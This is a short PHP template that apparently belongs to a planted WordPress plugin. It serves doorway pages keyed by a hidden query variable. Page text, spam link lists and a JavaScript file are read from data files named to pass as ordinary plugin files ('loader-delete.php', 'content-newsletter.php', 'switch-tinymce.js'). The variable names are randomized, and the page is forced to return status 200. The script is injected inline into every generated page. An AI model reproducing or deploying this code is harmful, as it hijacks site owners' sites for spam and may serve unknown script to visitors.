<?php
$rlg7LK = intval(get_query_var('gyormrso'));

if ($rlg7LK < 1 || $rlg7LK > 4642) return;
$pDNVNF60C = file(plugin_dir_path(__FILE__).'loader-delete.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$bA01G = explode(';', $pDNVNF60C[$rlg7LK]);
if (count($bA01G) < 2) return;
$t3oxHlGM = $bA01G[0];
$mLVwFI  = $bA01G[1];
$j32B3pxi = $bA01G[2];
$wmHHKQ  = $bA01G[3];
$csYi8J = $bA01G[4];
set_query_var('wblzt', $t3oxHlGM);

$rcDIkMA = '';
$dB7a3xF3 = plugin_dir_path(__FILE__).'content-newsletter.php';
if (is_file($dB7a3xF3)) {
	$qK1Eda1y = file($dB7a3xF3, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($qK1Eda1y);
	shuffle($qK1Eda1y);
	$dRFqVX = mt_rand(2, 5);
	if (count($qK1Eda1y) > $dRFqVX) {
		for ($dykiij7g = 0; $dykiij7g < $dRFqVX; $dykiij7g++) {
			$qKtEuJw = array_shift($qK1Eda1y);
			$rcDIkMA .= '<p><a href="'.$qKtEuJw.'">'.$qKtEuJw.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $t3oxHlGM; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $mLVwFI . "</p>\n";
				if (strlen($wmHHKQ) > 0) echo "<p>" . $wmHHKQ . "</p>\n";
				if (strlen($j32B3pxi) > 0) echo "<p>" . $j32B3pxi . "</p>\n";
				if (strlen($csYi8J) > 0) echo '<p><a href="#"><img src="'.$csYi8J.'"></a>' . "</p>\n";
				echo $rcDIkMA;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$ddIYEP3EKa = plugin_dir_path(__FILE__) . 'switch-tinymce.js';
if (is_file($ddIYEP3EKa)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($ddIYEP3EKa);
	echo '</script>';
}
get_footer();
?>
